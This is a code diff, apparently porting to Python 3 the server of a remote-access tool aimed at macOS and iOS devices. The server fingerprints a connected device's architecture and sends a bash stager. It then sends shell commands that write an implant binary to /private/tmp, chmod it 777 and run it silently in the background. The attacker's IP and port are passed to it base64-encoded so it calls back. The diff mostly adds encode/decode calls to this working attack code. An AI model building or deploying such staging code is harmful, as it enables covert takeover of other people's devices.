@@ -102,24 +102,20 @@ class Server:
         print("end start multihandler")
 
     def craft_payload(self, device_arch):
-        # TODO: Detect uid before we send executable
         if not self.host:
             raise ValueError('Server host not set')
         if not self.port:
             raise ValueError('Server port not set')
         payload_parameter = h.b64(json.dumps(
-            {"ip": self.host, "port": self.port, "debug": self.debug}))
-        if device_arch in self.macos_architectures:
+            {"ip": self.host, "port": self.port, "debug": self.debug}).encode())
+        if device_arch.decode() in self.macos_architectures:
             self.verbose_print("Detected macOS")
             f = open("resources/esplmacos", "rb")
             payload = f.read()
             f.close()
             # save to tmp,
-            instructions = \
-                "cat >/private/tmp/tmpespl;" +\
-                "chmod 777 /private/tmp/tmpespl;" +\
-                "mv /private/tmp/tmpespl /private/tmp/espl;" +\
-                "/private/tmp/espl "+payload_parameter+" 2>/dev/null &\n"
+            instructions = ("cat >/private/tmp/tmpespl;" + "chmod 777 /private/tmp/tmpespl;" +
+                            "mv /private/tmp/tmpespl /private/tmp/espl;" + "/private/tmp/espl " + payload_parameter.decode() + " 2>/dev/null &\n")
             return (instructions, payload)
         elif device_arch in self.ios_architectures:
             self.verbose_print("Detected iOS")
@@ -168,7 +164,7 @@ class Server:
         # identify device
         hostAddress = addr[0]
         self.verbose_print("Connecting to "+hostAddress)
-        conn.send(identification_shell_command)
+        conn.send(identification_shell_command.encode())
         device_arch = conn.recv(128).strip()
         if not device_arch:
             return
@@ -182,7 +178,7 @@ class Server:
             return
         self.verbose_print("Sending Payload")
         self.debug_print(bash_stager.strip())
-        conn.send(bash_stager)
+        conn.send(bash_stager.encode())
 
         # send executable
         self.debug_print("Sending Executable")
